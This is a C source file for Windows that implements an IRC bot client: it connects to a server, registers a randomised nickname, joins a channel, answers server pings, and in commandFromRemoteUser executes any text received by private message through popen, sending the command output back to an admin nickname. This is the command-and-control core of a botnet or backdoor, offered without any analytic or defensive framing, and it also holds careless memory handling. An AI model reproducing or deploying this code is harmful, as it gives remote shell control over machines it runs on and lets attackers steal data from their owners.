#include "functions.h"

SOCKET createSocket(char * host_irc, unsigned short port_irc)
{
    SOCKET _socket;
    WSADATA wsa_data;
    struct hostent *host;
    struct sockaddr_in sock_addr;

    //initialise Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        printf("WSA Initialization failed!\n");
        WSACleanup();
        return 0;
    }

    //resolve IP address for hostname
    if ((host = gethostbyname(host_irc)) == NULL)
    {
        printf("Failed to resolve hostname!\n");
        WSACleanup();
        return 0;
    }

    //setup our socket address structure
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(port_irc);
    sock_addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if ((_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        printf("Socket creation failed!\n");
        WSACleanup();
        return 0;
    }

    //attempt to connect to server
    if (connect(_socket, (struct sockaddr*)(&sock_addr), sizeof(sock_addr)) != 0)
    {
        printf("Failed to establish connection with server!\n");
        WSACleanup();
        return 0;
    }

    return _socket;
}

void deleteSocket(SOCKET _socket)
{
    shutdown(_socket, SD_SEND);	//shutdown our socket
    closesocket(_socket);       //close our socket entirely
    WSACleanup();               //cleanup Winsock
}



//send user and nick to irc host
void sendUserNick(  SOCKET _socket,
                    struct nickname *nicknm,
                    struct vars_messages *vars_msg)
{
    char    name[SIZE_STR],
            tmp_1[SIZE_STR], tmp_2[SIZE_STR],
            tmp_3[SIZE_STR], tmp_4[SIZE_STR],
            tmp_5[SIZE_STR];

    char *msg_nick_name =
            (char *)malloc(strlen(nicknm->prefix_name)
                           + strlen(nicknm->prefix_nick) + 128);
    srand((unsigned int)time(0));
    sprintf(msg_nick_name, USER" %s%d 0 * :%s\n"NICK" %s%d\n",
            nicknm->prefix_name, rand(), nicknm->bot_name,
            nicknm->prefix_nick, rand());
    sscanf(msg_nick_name, "%s%s%s%s%s%s%s",
           tmp_1, name, tmp_2, tmp_3, tmp_4, tmp_5, vars_msg->nick);
    send(_socket, msg_nick_name, (int)strlen(msg_nick_name), 0);
    printf("%s", msg_nick_name);
    free(msg_nick_name);
}

//join to channel
void joinToChannel(SOCKET _socket,
                   struct commands *cmds,
                   struct buffers *buffs)
{
    if (strstr(buffs->buffer_from, MOTD) || strstr(buffs->buffer_from, MODE))
    {
        send(_socket, cmds->cmd_join, (int)strlen(cmds->cmd_join), 0);
        printf("%s", cmds->cmd_join);
    }
}

//for stay on a server we play the game ping pong with server
boolean pingPong(SOCKET _socket,
              struct buffers *buff,
              struct commands *cmds
              )
{
    unsigned int len_cmd_pong = strlen(cmds->cmd_pong);
    if(!strncmp (PING, buff->buffer_from, 4))
    {
        printf("%s", buff->buffer_from);
        cmds->cmd_ping = (char *) malloc(strlen(buff->buffer_from) + len_cmd_pong);
        buff->sub_buff_from = strchr(buff->buffer_from, ':');
        sprintf(cmds->cmd_ping, "%s%s", cmds->cmd_pong, buff->sub_buff_from);
        printf("%s", cmds->cmd_ping);
        send(_socket, cmds->cmd_ping, (int)strlen(cmds->cmd_ping), 0);
        free (cmds->cmd_ping);
        return TRUE;
    }
    return  FALSE;
}



//if parsing cmd from server and nicks equally
enum FlagsCommandRemoteUser commandFromRemoteUser(SOCKET _socket,
                           struct buffers *buffs,
                           struct commands *cmds,
                           struct vars_messages *vars_msgs
                           )
{
    FILE *io_buff;
    if(!strcmp(vars_msgs->srvcmd, PRIVMSG)
            && !strcmp(vars_msgs->snick, vars_msgs->nick))
    {
        /*
            read data after second char ':'
            full string ->
            [ userfrom@ip servercmd userto : {command param ...}
             (this subsrtring is write to var - pcmd) ]
        */
        cmds->cmd = (char *)malloc(strlen(buffs->buffer_from));
        cmds->cmd = buffs->buffer_from;
        while(cmds->cmd[1] != ':')
        {
            cmds->cmd++;
        }
        cmds->cmd+=2;

        //command for reconnect server
        if (strstr(cmds->cmd, CMD_RECONNECT))
        {
            send(_socket, cmds->cmd_part, (int)strlen(cmds->cmd_part), 0);
            send(_socket, cmds->cmd_quit, (int)strlen(cmds->cmd_quit), 0);
            return Reconnect;
        }
        //command for stopping bot
        if (strstr(cmds->cmd, CMD_STOP))
        {
            return Stopped;
        }

        io_buff = popen(cmds->cmd, "rt");
        printf("%s", cmds->cmd);

        //send result of command
        while(fgets(buffs->buffer_tmp, sizeof(buffs->buffer_tmp), io_buff))
        {
            strcpy(buffs->buffer_to, PRIVMSG_TO_ADMIN);
            strcat(buffs->buffer_to, buffs->buffer_tmp);
            send(_socket, buffs->buffer_to, (int)strlen(buffs->buffer_to), 0);
        }

        memset(buffs->buffer_to, 0, sizeof(buffs->buffer_to));
        memset(buffs->buffer_tmp, 0, sizeof(buffs->buffer_tmp));
    }
    else
    {
        printf("%s", buffs->buffer_from);
        return NotPrivMsg;
    }

    return PrivMsg;
}
